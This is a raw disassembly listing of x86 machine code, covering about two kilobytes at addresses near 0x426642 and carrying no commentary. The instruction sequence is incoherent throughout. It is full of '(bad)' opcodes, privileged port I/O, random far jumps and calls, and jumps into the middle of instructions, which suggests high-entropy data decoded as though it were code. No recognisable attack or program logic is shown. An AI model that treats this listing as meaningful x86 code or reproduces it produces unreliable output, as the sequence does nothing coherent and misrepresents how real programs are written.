  426642:	pop    edx
  426643:	fadd   QWORD PTR [ebx+0xa]
  426646:	pop    ebx
  426647:	ins    BYTE PTR es:[edi],dx
  426648:	mov    es,esi
  42664a:	ja     0x4265d2
  42664c:	lahf   
  42664d:	dec    eax
  42664e:	cld    
  42664f:	push   ebx
  426650:	shr    BYTE PTR [edi],1
  426652:	lods   al,BYTE PTR ds:[esi]
  426653:	clc    
  426654:	xor    eax,0x417c5b8e
  426659:	popf   
  42665a:	xchg   esi,eax
  42665b:	pop    edi
  42665c:	xor    al,0x36
  42665e:	es loope 0x42660d
  426661:	adc    DWORD PTR [edi-0x4b],ebx
  426664:	add    ecx,DWORD PTR [ebp-0x42]
  426667:	xor    DWORD PTR [ecx+ecx*2+0x24],eax
  42666b:	dec    edx
  42666c:	mov    esp,0xb17ef6d6
  426671:	xor    eax,0x42dc597c
  426676:	pop    es
  426677:	in     eax,dx
  426678:	pop    ebx
  426679:	mov    esp,0x54ea69dc
  42667e:	xlat   BYTE PTR ds:[ebx]
  42667f:	jae    0x4266b5
  426681:	pop    ebp
  426682:	cmc    
  426683:	dec    esi
  426684:	xchg   BYTE PTR [ecx-0x64],al
  426687:	and    esi,DWORD PTR [esi]
  426689:	shr    dh,cl
  42668b:	jmp    0x1904668c
  426690:	jno    0x42668e
  426692:	test   al,0x3c
  426694:	inc    ebp
  426695:	cmp    BYTE PTR [ecx-0x6c],cl
  426698:	das    
  426699:	out    0xa3,eax
  42669b:	in     al,dx
  42669c:	pop    esp
  42669d:	adc    eax,0x98afb1e9
  4266a2:	lds    ebx,FWORD PTR [edi+0x6df4702a]
  4266a8:	inc    ecx
  4266a9:	out    0x8d,al
  4266ab:	mov    ebx,0xaf9c5d02
  4266b0:	xchg   ecx,eax
  4266b1:	es pop ds
  4266b3:	outs   dx,BYTE PTR ds:[esi]
  4266b4:	mov    edx,0x97f98594
  4266b9:	pop    edi
  4266ba:	clc    
  4266bb:	and    BYTE PTR [edx],dh
  4266bd:	cmp    eax,0xadfec77d
  4266c2:	add    ah,BYTE PTR [ecx+eax*2+0x6617c5]
  4266c9:	push   edx
  4266ca:	inc    edi
  4266cb:	popf   
  4266cc:	fistp  QWORD PTR [esi+ebp*2]
  4266cf:	sbb    ebx,DWORD PTR [edx-0x4d5077c9]
  4266d5:	inc    eax
  4266d6:	inc    ecx
  4266d7:	or     ah,BYTE PTR [esi-0x80]
  4266da:	in     al,0x4e
  4266dc:	jl     0x42667b
  4266de:	ret    0x43f0
  4266e1:	jnp    0x426722
  4266e3:	fwait
  4266e4:	pop    ebx
  4266e5:	clc    
  4266e6:	jmp    0x8679:0x84bbbfed
  4266ed:	in     al,0xe4
  4266ef:	mov    dh,0x7d
  4266f1:	sub    eax,DWORD PTR [eax]
  4266f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266f4:	ja     0x426763
  4266f6:	ins    DWORD PTR es:[edi],dx
  4266f7:	stc    
  4266f8:	adc    esp,DWORD PTR [esp+ebp*4+0x17]
  4266fc:	mov    ah,BYTE PTR [edi]
  4266fe:	inc    edi
  4266ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426700:	pushf  
  426701:	push   ss
  426702:	dec    eax
  426703:	mov    edi,fs
  426705:	mov    ds,WORD PTR [ebx-0xc]
  426708:	fsubrp st(7),st
  42670a:	pop    es
  42670b:	pop    ebp
  42670c:	xchg   esi,eax
  42670d:	ss xchg ebp,eax
  42670f:	test   al,0x7a
  426711:	pushf  
  426712:	push   ecx
  426713:	stos   BYTE PTR es:[edi],al
  426714:	ja     0x42674f
  426716:	scas   eax,DWORD PTR es:[edi]
  426717:	ret    
  426718:	leave  
  426719:	pop    edi
  42671a:	out    dx,al
  42671b:	push   ss
  42671c:	js     0x4266d6
  42671e:	into   
  42671f:	ret    0x54fc
  426722:	ror    DWORD PTR [edx+eax*8+0x7b],0x87
  426727:	mov    ch,0x72
  426729:	add    DWORD PTR [ebx+0x1e],esi
  42672c:	and    dl,al
  42672e:	iret   
  42672f:	test   al,0x4f
  426731:	inc    ebx
  426732:	mov    al,0x38
  426734:	adc    BYTE PTR [ebp-0x7b],cl
  426737:	xor    bl,BYTE PTR [edx+edx*8-0x70f8ec71]
  42673e:	dec    edx
  42673f:	outs   dx,BYTE PTR ds:[esi]
  426740:	inc    esp
  426741:	mov    cl,0x5d
  426743:	or     al,0x6c
  426745:	test   eax,0x5a4265ee
  42674a:	lods   al,BYTE PTR ds:[esi]
  42674b:	ja     0x4267bf
  42674d:	sbb    ebx,esi
  42674f:	xor    ch,0x78
  426752:	adc    dl,BYTE PTR [edi+ebp*8+0x2c793b97]
  426759:	outs   dx,DWORD PTR ds:[esi]
  42675a:	mov    BYTE PTR [esi],al
  42675c:	xchg   edi,eax
  42675d:	jmp    0x42672f
  42675f:	mov    edx,DWORD PTR [ecx]
  426761:	pop    esp
  426762:	add    eax,DWORD PTR [ebx]
  426764:	fmul   DWORD PTR [edx]
  426766:	push   ebx
  426767:	fs mov dh,0x19
  42676a:	mov    bh,0x92
  42676c:	bound  eax,QWORD PTR [ecx+eax*4]
  42676f:	and    al,0xdc
  426771:	arpl   dx,cx
  426773:	int3   
  426774:	aam    0x7c
  426776:	push   eax
  426777:	mov    ebx,DWORD PTR [ecx-0x52]
  42677a:	test   DWORD PTR [edx-0x63],edi
  42677d:	mov    ah,0xb4
  42677f:	cmp    eax,0x872b5d48
  426784:	test   al,0xc1
  426786:	xchg   ch,al
  426788:	repnz scas al,BYTE PTR es:[edi]
  42678a:	cli    
  42678b:	aaa    
  42678c:	dec    ebp
  42678d:	fs pop esp
  42678f:	jp     0x4267b7
  426791:	cmp    eax,0x5e8417fb
  426796:	dec    edi
  426797:	mov    bl,0xb9
  426799:	cmc    
  42679a:	in     al,0x2f
  42679c:	mov    ebx,0x5ce973b6
  4267a1:	jmp    0xd2067be4
  4267a6:	xchg   esp,eax
  4267a7:	push   es
  4267a8:	mov    dh,0xb7
  4267aa:	hlt    
  4267ab:	stc    
  4267ac:	mov    gs,WORD PTR [edi+ebp*8-0x1209778b]
  4267b3:	(bad)  
  4267b4:	call   0xf3ef9c27
  4267b9:	aas    
  4267ba:	and    edi,DWORD PTR [ebx-0x7e19c542]
  4267c0:	and    eax,0x2c50cd2
  4267c5:	jmp    0xca2a:0x45147542
  4267cc:	push   ecx
  4267cd:	and    BYTE PTR [edx],bl
  4267cf:	test   al,0xb0
  4267d1:	adc    cl,dl
  4267d3:	pop    eax
  4267d4:	push   ss
  4267d5:	mov    bl,0xe0
  4267d7:	cwde   
  4267d8:	out    dx,al
  4267d9:	sar    DWORD PTR [esi+0x27fde85f],1
  4267df:	das    
  4267e0:	in     eax,0x9c
  4267e2:	scas   eax,DWORD PTR es:[edi]
  4267e3:	out    dx,eax
  4267e4:	popa   
  4267e5:	in     al,0xe1
  4267e7:	mov    es,ebx
  4267e9:	xchg   esi,eax
  4267ea:	call   0x3fb4:0x6a3ce09c
  4267f1:	push   0xffffffe0
  4267f3:	(bad)  
  4267f4:	popf   
  4267f5:	stos   DWORD PTR es:[edi],eax
  4267f6:	loope  0x426867
  4267f8:	dec    edi
  4267f9:	jl     0x426814
  4267fb:	xor    BYTE PTR ss:[edx-0x636f982b],bh
  426802:	dec    ebp
  426803:	mul    edi
  426805:	je     0x42683a
  426807:	mov    al,ds:0xf46c19c7
  42680c:	pop    ss
  42680d:	mov    BYTE PTR [eax],dh
  42680f:	jnp    0x4267d9
  426811:	fistp  WORD PTR [edx-0x32]
  426814:	or     BYTE PTR [ecx+esi*2-0x3aedb100],dh
  42681b:	pop    edx
  42681c:	lahf   
  42681d:	jle    0x426886
  42681f:	jl     0x42689c
  426821:	es push esp
  426823:	(bad)  
  426824:	or     eax,edx
  426826:	fcom   QWORD PTR ds:0x8484acbe
  42682c:	jmp    0xcbea9f26
  426831:	sub    al,dh
  426833:	xchg   ecx,eax
  426834:	aam    0x64
  426836:	sub    bl,dh
  426838:	mov    edx,DWORD PTR [ebp-0x5f7ebedf]
  42683e:	xor    eax,0xf76cec85
  426843:	cdq    
  426844:	dec    esi
  426845:	adc    DWORD PTR [edi],esp
  426847:	push   ebx
  426848:	ror    BYTE PTR [ecx-0x989c03b],cl
  42684e:	cmp    eax,0x6fa1734
  426853:	adc    DWORD PTR [ebp-0xc],edx
  426856:	mov    edx,0x6bbe2a37
  42685b:	imul   edi,DWORD PTR [ebp+0xd],0xffffffca
  42685f:	retf   0x7184
  426862:	call   0x5b39:0xfaad5912
  426869:	es push cs
  42686b:	sahf   
  42686c:	lahf   
  42686d:	sub    DWORD PTR [ecx-0x14dd300a],esp
  426873:	out    dx,eax
  426874:	ss mov ebx,fs
  426877:	inc    ecx
  426878:	push   ss
  426879:	dec    ebp
  42687a:	shr    DWORD PTR [ebp+0x618bfd09],1
  426880:	dec    eax
  426881:	mov    bl,0xc
  426883:	in     eax,dx
  426884:	aam    0x44
  426886:	in     al,dx
  426887:	pop    ss
  426888:	add    ch,dh
  42688a:	xor    cl,BYTE PTR [edx+0x21]
  42688d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42688e:	js     0x4268ed
  426890:	jmp    0x426906
  426892:	jb     0x4268bb
  426894:	(bad)  
  426895:	mov    edx,0x34915e12
  42689a:	xchg   ecx,eax
  42689b:	adc    edx,DWORD PTR [edi-0x30]
  42689e:	repz mov ds:0xf4b8c512,eax
  4268a4:	xor    al,0x37
  4268a6:	push   edi
  4268a7:	and    al,BYTE PTR [esi-0x53625441]
  4268ad:	pop    ebp
  4268ae:	jmp    0x76a8f195
  4268b3:	adc    dl,BYTE PTR [ecx+0x13e70c68]
  4268b9:	sti    
  4268ba:	mov    ebx,0xcb40cb72
  4268bf:	les    eax,FWORD PTR [esi]
  4268c1:	adc    cl,ah
  4268c3:	scas   al,BYTE PTR es:[edi]
  4268c4:	(bad)  
  4268c5:	cld    
  4268c6:	and    eax,0x4fd8959d
  4268cb:	retf   0x41ad
  4268ce:	fwait
  4268cf:	ins    DWORD PTR es:[edi],dx
  4268d0:	imul   esi,DWORD PTR ds:0xd1d7f97b,0x3b
  4268d7:	mov    al,ds:0x2eaf2d08
  4268dc:	push   esi
  4268dd:	jecxz  0x42693a
  4268df:	jno    0x426878
  4268e1:	imul   edx,DWORD PTR [ecx],0x25efce80
  4268e7:	test   eax,0x2fe9979a
  4268ec:	call   DWORD PTR [esi+0x332e0729]
  4268f2:	ins    BYTE PTR es:[edi],dx
  4268f3:	xor    BYTE PTR [ebp-0xf],bl
  4268f6:	sbb    DWORD PTR [edi+0x71cb0b97],esp
  4268fc:	in     eax,0x6
  4268fe:	je     0x4268ac
  426900:	daa    
  426901:	es stos DWORD PTR es:[edi],eax
  426903:	ins    BYTE PTR es:[edi],dx
  426904:	xchg   esp,eax
  426905:	mov    ch,BYTE PTR [edi-0x21553367]
  42690b:	push   es
  42690c:	out    dx,eax
  42690d:	ss ss iret 
  426910:	cmp    BYTE PTR [eax+edx*4+0x1d230819],ah
  426917:	sbb    BYTE PTR [esi+0x26],0xc9
  42691b:	mov    cl,BYTE PTR [ebp+0x6e]
  42691e:	sub    al,0x63
  426920:	or     eax,0x538ddf7a
  426925:	test   eax,0x8d5c6113
  42692a:	lods   eax,DWORD PTR ds:[esi]
  42692b:	push   ecx
  42692c:	popf   
  42692d:	cli    
  42692e:	xchg   ebp,eax
  42692f:	iret   
  426930:	(bad)  
  426931:	xlat   BYTE PTR ds:[ebx]
  426932:	lods   al,BYTE PTR ds:[esi]
  426933:	or     ebp,DWORD PTR [ecx-0x6072ead2]
  426939:	mov    al,ds:0x57133809
  42693e:	xchg   edi,eax
  42693f:	pop    esi
  426940:	ds (bad) 
  426942:	leave  
  426943:	mov    eax,ds:0x6928cdd0
  426948:	xchg   BYTE PTR [edi],al
  42694a:	inc    edx
  42694b:	ins    BYTE PTR es:[edi],dx
  42694c:	mov    esi,0x31e07fd9
  426951:	sbb    BYTE PTR [edx],dh
  426953:	mov    ?,WORD PTR [esi+0x1d1a6d70]
  426959:	ds mov ch,0x3a
  42695c:	outs   dx,BYTE PTR ds:[esi]
  42695d:	in     al,0x17
  42695f:	inc    edx
  426960:	sbb    esp,esi
  426962:	pop    eax
  426963:	ja     0x426964
  426965:	scas   eax,DWORD PTR es:[edi]
  426966:	(bad)  
  426967:	idiv   DWORD PTR [ecx-0x14]
  42696a:	repz xchg ebp,eax
  42696c:	adc    ah,BYTE PTR [eax-0x6b]
  42696f:	or     al,0x55
  426971:	or     edi,esi
  426973:	mov    al,0xd
  426975:	push   esi
  426976:	popf   
  426977:	(bad)  
  426978:	fsub   QWORD PTR [ecx]
  42697a:	pop    edi
  42697b:	xor    dh,BYTE PTR [esi]
  42697d:	inc    edx
  42697e:	loope  0x426931
  426980:	stc    
  426981:	mov    bl,0x49
  426983:	inc    eax
  426984:	xor    BYTE PTR [ebp+0x32],bl
  426987:	(bad)  
  426989:	push   cs
  42698a:	sbb    ah,BYTE PTR [ebp-0x66ddcb9]
  426990:	inc    edx
  426991:	mov    eax,0x393588bf
  426996:	inc    eax
  426997:	repz int3 
  426999:	inc    ebp
  42699a:	or     cl,ch
  42699c:	sbb    eax,0x90cae741
  4269a1:	test   eax,0x9f31bee0
  4269a6:	adc    edx,esp
  4269a8:	jmp    0x426a1b
  4269aa:	test   al,0xd4
  4269ac:	outs   dx,BYTE PTR ds:[esi]
  4269ad:	dec    edi
  4269ae:	or     DWORD PTR [eax+0x6a],ecx
  4269b1:	hlt    
  4269b2:	xor    edi,DWORD PTR [ebp+eiz*2+0x7]
  4269b6:	push   edx
  4269b7:	imul   esi,DWORD PTR [eax-0x2d048e86],0x4e
  4269be:	aaa    
  4269bf:	push   edi
  4269c0:	add    eax,0x3109816d
  4269c5:	and    eax,0x2fbd7e00
  4269ca:	ret    
  4269cb:	add    ecx,DWORD PTR [esi+eax*8-0x70f598]
  4269d2:	icebp  
  4269d3:	data16 sahf 
  4269d5:	dec    eax
  4269d6:	adc    eax,0xecbaaec8
  4269db:	mov    dl,0x9e
  4269dd:	adc    ecx,DWORD PTR [esi]
  4269df:	dec    ebp
  4269e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269e1:	rol    ebx,1
  4269e3:	or     BYTE PTR [ebp+0x48],0x41
  4269e7:	out    0xbb,eax
  4269e9:	scas   eax,DWORD PTR es:[edi]
  4269ea:	iret   
  4269eb:	adc    ebp,DWORD PTR [ecx]
  4269ed:	(bad)  
  4269ee:	cmp    cl,BYTE PTR [eax]
  4269f0:	retf   
  4269f1:	cmc    
  4269f2:	pop    ss
  4269f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269f4:	out    dx,al
  4269f5:	and    BYTE PTR [esp+ecx*2],ch
  4269f8:	repz adc eax,0x1ef9d53d
  4269fe:	pop    esp
  4269ff:	call   0xd300:0x10f4f9e3
  426a06:	pushf  
  426a07:	addr16 pop eax
  426a09:	jo     0x426a38
  426a0b:	stos   DWORD PTR es:[edi],eax
  426a0c:	xlat   BYTE PTR ds:[ebx]
  426a0d:	xor    DWORD PTR [edi],edi
  426a0f:	bound  eax,QWORD PTR [esi+eiz*1+0x4dbf089f]
  426a16:	ret    0x535f
  426a19:	iret   
  426a1a:	lock jle 0x426a05
  426a1d:	stos   BYTE PTR es:[edi],al
  426a1e:	(bad)  
  426a1f:	jl     0x4269c1
  426a21:	mov    ebx,0x4c849ae3
  426a26:	push   eax
  426a27:	and    BYTE PTR ds:0x75a0d233,dh
  426a2d:	cwde   
  426a2e:	xchg   esi,eax
  426a2f:	ds and al,0x10
  426a32:	add    eax,0x48aa9a85
  426a37:	sub    ebp,ebp
  426a39:	shl    BYTE PTR [esi-0x1ad8dc5f],0x19
  426a40:	pop    ebx
  426a41:	cdq    
  426a42:	sti    
  426a43:	add    BYTE PTR [ecx+eax*2],cl
  426a46:	es or  ah,ch
  426a49:	mov    edx,0x460e7dcb
  426a4e:	popa   
  426a4f:	out    dx,al
  426a50:	adc    eax,0x23572cc1
  426a55:	add    edx,DWORD PTR [ecx+0x4a]
  426a58:	icebp  
  426a59:	(bad)  
  426a5a:	sbb    esp,ebp
  426a5c:	pop    DWORD PTR [eax+0x54]
  426a5f:	js     0x4269f0
  426a61:	ins    BYTE PTR es:[edi],dx
  426a62:	inc    ebx
  426a63:	lods   al,BYTE PTR ds:[esi]
  426a64:	push   ss
  426a65:	pop    ecx
  426a66:	test   al,0xbf
  426a68:	retf   0x2bb7
  426a6b:	add    DWORD PTR [ebx+0x4c],edi
  426a6e:	mov    ebp,0x4e9c5b4d
  426a73:	cli    
  426a74:	lock fld DWORD PTR [ebp-0x30]
  426a78:	stos   DWORD PTR es:[edi],eax
  426a79:	sbb    ah,BYTE PTR [edi-0x5f]
  426a7c:	rcr    BYTE PTR [ebx+0x67],0xed
  426a80:	(bad)  
  426a81:	push   0x5fd3717
  426a86:	add    edi,edx
  426a88:	xchg   DWORD PTR [ecx-0x34],ebx
  426a8b:	mov    ah,0x60
  426a8d:	adc    DWORD PTR [esi-0x50],edi
  426a90:	inc    ebx
  426a91:	es add esp,esi
  426a94:	jo     0x426a94
  426a96:	(bad)  
  426a97:	iret   
  426a98:	and    al,0x8a
  426a9a:	mov    ah,0x6b
  426a9c:	fmul   DWORD PTR [ebx]
  426a9e:	push   ss
  426a9f:	popf   
  426aa0:	jne    0x426a29
  426aa2:	hlt    
  426aa3:	jge    0x426a3a
  426aa5:	and    eax,0xbc408f1c
  426aaa:	sti    
  426aab:	mov    ebp,0x8e8017df
  426ab0:	pop    edi
  426ab1:	add    eax,0x86b2dc8d
  426ab6:	loope  0x426b07
  426ab8:	sub    bl,BYTE PTR [edi+0x6f]
  426abb:	loop   0x426b13
  426abd:	pop    ebx
  426abe:	ja     0x426ab9
  426ac0:	iret   
  426ac1:	in     eax,dx
  426ac2:	mov    bl,0x7f
  426ac4:	xor    eax,0xe6c355a
  426ac9:	scas   al,BYTE PTR es:[edi]
  426aca:	test   BYTE PTR [ecx],dh
  426acc:	or     bh,BYTE PTR [esi-0x40242b8a]
  426ad2:	mov    edi,0x478ec6a4
  426ad7:	push   es
  426ad8:	shr    DWORD PTR [esi],1
  426ada:	ds aaa 
  426adc:	mov    ebx,0xf6db83f
  426ae1:	pushw  es
  426ae3:	sub    BYTE PTR [eax+0x4a4380bb],cl
  426ae9:	inc    ebp
  426aea:	ret    
  426aeb:	fsubr  DWORD PTR [esi+edi*8-0x12]
  426aef:	mov    esi,0xa748629
  426af4:	fdiv   st,st(2)
  426af6:	adc    esi,DWORD PTR [esi+ebp*1-0x54]
  426afa:	or     DWORD PTR [bp+si+0x59],0x19a63416
  426b02:	dec    edi
  426b03:	ret    
  426b04:	je     0x426aab
  426b06:	sbb    ah,BYTE PTR [eax]
  426b08:	(bad)  
  426b09:	mov    edx,0xa43470a
  426b0e:	cmp    eax,0xa7c004f
  426b13:	adc    BYTE PTR [edi+0x26],0xfe
  426b17:	out    0xb6,al
  426b19:	dec    ebx
  426b1a:	inc    ebx
  426b1b:	ins    DWORD PTR es:[edi],dx
  426b1c:	dec    edx
  426b1d:	inc    ebp
  426b1e:	mov    cl,0xa
  426b20:	arpl   WORD PTR [esi-0x6add0c9f],ax
  426b26:	sbb    al,0xef
  426b28:	pop    ds
  426b29:	push   edx
  426b2a:	dec    ecx
  426b2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b2c:	hlt    
  426b2d:	mov    ah,0xf7
  426b2f:	jp     0x426b55
  426b31:	dec    esp
  426b32:	inc    edx
  426b33:	or     BYTE PTR [ebp-0x62d37244],0xd6
  426b3a:	mov    dh,0x26
  426b3c:	imul   ebx,DWORD PTR [ebx+0x5d],0x5d8059bb
  426b43:	jg     0x426bb1
  426b45:	fist   DWORD PTR [esi]
  426b47:	cmp    eax,0xa96c639c
  426b4c:	int    0xc1
  426b4e:	in     eax,dx
  426b4f:	push   0xfffffff5
  426b51:	inc    ebp
  426b52:	and    dl,ah
  426b54:	inc    eax
  426b55:	fmul   st,st(6)
  426b57:	mul    BYTE PTR [ebp+0x40]
  426b5a:	pushf  
  426b5b:	jg     0x426aff
  426b5d:	or     dh,0x6e
  426b60:	dec    esi
  426b61:	(bad)  
  426b62:	bound  edx,QWORD PTR [edx-0x49e7faee]
  426b68:	add    al,0x7f
  426b6a:	or     edi,ebp
  426b6c:	(bad)  
  426b6d:	mov    ds:0x8a71fa,al
  426b72:	mov    cs,WORD PTR [edi+0x16cf1c01]
  426b78:	js     0x426bd0
  426b7a:	xchg   ecx,eax
  426b7b:	aad    0xf5
  426b7d:	sbb    al,0xa2
  426b7f:	xor    al,0x1b
  426b81:	cmp    dh,BYTE PTR [ecx+0x2d]
  426b84:	jp     0x426bd4
  426b86:	pop    ebp
  426b87:	push   ecx
  426b88:	lahf   
  426b89:	xor    al,0x6
  426b8b:	or     ecx,ecx
  426b8d:	sbb    al,cl
  426b8f:	fcmovnbe st,st(0)
  426b91:	out    0x2f,eax
  426b93:	call   0xd5e88ffc
  426b98:	rdpmc  
  426b9a:	(bad)  
  426b9b:	daa    
  426b9c:	sti    
  426b9d:	out    dx,eax
  426b9e:	int3   
  426b9f:	rol    DWORD PTR [ebp-0x56],cl
  426ba2:	push   eax
  426ba3:	shl    BYTE PTR [ebx+0x7d319c72],0x69
  426baa:	mov    ds:0xc3b269fd,eax
  426baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426bb0:	std    
  426bb1:	xchg   edx,eax
  426bb2:	add    cl,bh
  426bb4:	sar    BYTE PTR [ecx],0x28
  426bb7:	ret    
  426bb8:	das    
  426bb9:	sbb    BYTE PTR [edx-0x745443ed],dh
  426bbf:	mov    ah,0xf1
  426bc1:	popf   
  426bc2:	and    DWORD PTR ds:0x3651e168,ebp
  426bc8:	pop    es
  426bc9:	scas   al,BYTE PTR es:[edi]
  426bca:	jns    0x426b91
  426bcc:	nop
  426bcd:	sbb    al,ch
  426bcf:	lods   eax,DWORD PTR ds:[esi]
  426bd0:	sbb    bh,BYTE PTR ds:0xb17cf29e
  426bd6:	loopne 0x426c56
  426bd8:	add    al,0xe
  426bda:	test   al,0xee
  426bdc:	sub    al,0xb0
  426bde:	outs   dx,DWORD PTR ds:[esi]
  426bdf:	sub    eax,0x25d0682f
  426be4:	add    bh,ch
  426be6:	add    al,ch
  426be8:	mov    ds:0x2a86fdc5,eax
  426bed:	sbb    edi,DWORD PTR [ebx-0x1b424829]
  426bf3:	inc    edi
  426bf4:	dec    ecx
  426bf5:	mov    ah,0x32
  426bf7:	mov    ecx,0x82e3ea7
  426bfc:	mov    WORD PTR cs:[ebp+0x4458e8a7],es
  426c03:	ret    0x23af
  426c06:	or     eax,0xe2d9ab1b
  426c0b:	pop    esp
  426c0c:	clc    
  426c0d:	mov    DWORD PTR [edx-0x215f41d9],edx
  426c13:	mov    dl,0xe0
  426c15:	mov    ecx,0x3e2b27fb
  426c1a:	pop    ebp
  426c1b:	pop    esi
  426c1c:	ret    
  426c1d:	push   es
  426c1e:	push   esi
  426c1f:	ret    
  426c20:	xchg   esp,eax
  426c21:	mov    ecx,0x1391328f
  426c26:	adc    edi,0xd4eb4c1d
  426c2c:	sti    
  426c2d:	inc    edx
  426c2e:	daa    
  426c2f:	outs   dx,DWORD PTR ds:[esi]
  426c30:	push   0xffffff9b
  426c32:	pop    es
  426c33:	mov    edi,DWORD PTR [ebx]
  426c35:	mov    ds:0x4737d9a7,al
  426c3a:	js     0x426c03
  426c3c:	test   DWORD PTR [edx+0x56],edi
  426c3f:	mov    esi,0xf36ca632
  426c44:	and    eax,0x754b7a3
  426c49:	xchg   ecx,eax
  426c4a:	xlat   BYTE PTR ds:[ebx]
  426c4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c4c:	sahf   
  426c4d:	mov    ah,0x9b
  426c4f:	(bad)  
  426c50:	mov    al,0x6
  426c52:	aad    0xd8
  426c54:	je     0x426c67
  426c56:	aas    
  426c57:	jmp    0x1ae19900
  426c5c:	sub    bl,cl
  426c5e:	dec    ecx
  426c5f:	repnz dec esp
  426c61:	push   0xfb59cff0
  426c66:	push   DWORD PTR [ebp+0xebe4720]
  426c6c:	inc    esp
  426c6d:	sar    bl,1
  426c6f:	aad    0xb3
  426c71:	int3   
  426c72:	dec    edi
  426c73:	daa    
  426c74:	stos   DWORD PTR es:[edi],eax
  426c75:	push   eax
  426c76:	icebp  
  426c77:	aad    0x16
  426c79:	jmp    0x8c08:0xf01942bb
  426c80:	scas   eax,DWORD PTR es:[edi]
  426c81:	xor    esp,DWORD PTR [edx-0x35916daa]
  426c87:	ret    0x461
  426c8a:	jmp    0x983:0xb9bca55e
  426c91:	add    al,0x2d
  426c93:	iret   
  426c94:	shl    BYTE PTR [eax+0xf],cl
  426c97:	jns    0x426c52
  426c99:	add    BYTE PTR es:[eax],al
	...
  426d14:	and    eax,0x55d31474
  426d19:	repz out 0xf6,eax
  426d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d1d:	adc    bh,BYTE PTR [esi]
  426d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d22:	outs   dx,BYTE PTR ds:[esi]
  426d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d24:	xlat   BYTE PTR ds:[ebx]
  426d25:	inc    BYTE PTR [ecx]
  426d27:	add    BYTE PTR [esi+0x7],ch
  426d2a:	add    BYTE PTR [eax],al
  426d2c:	push   esi
  426d2d:	fxch   st(4)
  426d2f:	pop    edx
  426d30:	or     al,0x19
  426d32:	lods   al,BYTE PTR ds:[esi]
  426d33:	shl    edi,0x57
  426d36:	sub    ebx,ecx
  426d38:	ret    
  426d39:	mov    eax,0x2c4d32eb
  426d3e:	shl    BYTE PTR [ebx],1
  426d40:	int    0xcc
  426d42:	jae    0x426cc4
  426d44:	cs push esi
  426d46:	(bad)  [esi+0x6d]
  426d49:	mov    ebp,DWORD PTR [edi-0x4a72cc75]
  426d4f:	xchg   edx,eax
  426d50:	mov    edx,0xe0ce976b
  426d55:	mov    BYTE PTR [eax+eiz*4+0x7],ah
  426d59:	sub    DWORD PTR [eax],ebp
  426d5b:	imul   ecx,DWORD PTR [eax+ebx*1],0xfffffff3
  426d5f:	lock (bad) 
  426d61:	xlat   BYTE PTR ds:[ebx]
  426d62:	lea    esi,[edx-0x78646bb3]
  426d68:	pop    ebp
  426d69:	call   0xe4d7fce1
  426d6e:	sub    bl,BYTE PTR [ebx+0x46c141ba]
  426d74:	test   edx,0xf3782c1
  426d7a:	jecxz  0x426dc8
  426d7c:	dec    ecx
  426d7d:	pop    ebx
  426d7e:	jno    0x426def
  426d80:	pusha  
  426d81:	add    eax,0xf326afe3
  426d86:	mov    ebx,0xd88d9cdc
  426d8b:	dec    edx
  426d8c:	sbb    eax,0xe791dc94
  426d91:	push   cs
  426d92:	push   edx
  426d93:	fwait
  426d94:	das    
  426d95:	(bad)  
  426d96:	pop    ebp
  426d97:	mov    ecx,?
  426d99:	sar    DWORD PTR [ecx],0x1e
  426d9c:	lahf   
  426d9d:	test   eax,0x96b44963
  426da2:	xor    al,BYTE PTR [ecx+0x28]
  426da5:	dec    esi
  426da6:	push   ebx
  426da7:	repnz and al,0x42
  426daa:	mov    ebx,0xcb61e66
  426daf:	xchg   ebp,eax
  426db0:	retf   0x3c
  426db3:	and    ebx,edx
  426db5:	adc    al,0x1a
  426db7:	sahf   
  426db8:	ins    BYTE PTR es:[edi],dx
  426db9:	les    ecx,FWORD PTR [edi+eiz*4+0x17]
  426dbd:	add    BYTE PTR [ebx],ch
  426dbf:	mov    WORD PTR [edi+edi*2],fs
  426dc2:	rcr    DWORD PTR [esp+ebx*8],cl
  426dc5:	xor    esi,DWORD PTR [esi]
  426dc7:	lea    ebp,[ecx]
  426dc9:	mov    ?,WORD PTR [edi+edi*1-0x21baa09c]
  426dd0:	add    bh,al
  426dd2:	mov    ds:0xb6ceb88f,eax
  426dd7:	jge    0x426db8
  426dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dda:	into   
  426ddb:	push   ds
  426ddc:	pop    ss
  426ddd:	(bad)  
  426dde:	mov    ebx,0xa80957ab
  426de3:	retf   
  426de4:	in     al,0x39
  426de6:	dec    esi
  426de7:	and    DWORD PTR [edx],esi
  426de9:	dec    esp
  426dea:	int3   
  426deb:	mov    dh,0xc7
  426ded:	inc    edx
  426dee:	sahf   
  426def:	mov    BYTE PTR [edi],ah
  426df1:	out    dx,al
  426df2:	jle    0x426e60
  426df4:	mov    dh,0x2f
  426df6:	in     al,0x62
  426df8:	(bad)  
  426df9:	cmp    eax,0xc9befde1
  426dfe:	jnp    0x426de3
  426e00:	out    dx,al
  426e01:	mov    edx,0xa3a72c69
  426e06:	fadd   QWORD PTR [ecx+0x3e]
  426e09:	or     BYTE PTR [ebx],ah
  426e0b:	jae    0x426e19
  426e0d:	push   es
  426e0e:	jmp    0xda3a3835
  426e13:	cmp    edx,DWORD PTR [ebp+0x6a]
  426e16:	mov    eax,0xc640db48
  426e1b:	mov    WORD PTR [esi],fs
  426e1d:	jmp    DWORD PTR [esi-0x701c7e3a]
  426e23:	rol    dh,0x87
  426e26:	nop
  426e27:	jl     0x426e7d
  426e29:	or     dh,BYTE PTR [edi+edi*1+0x1d8d7e]
  426e30:	dec    esp
  426e31:	shr    esp,0xb9
  426e34:	retf   
  426e35:	loop   0x426de3
  426e37:	adc    al,dh
  426e39:	in     eax,0xe0
  426e3b:	rol    BYTE PTR [edi+eiz*2+0x70bf6112],cl
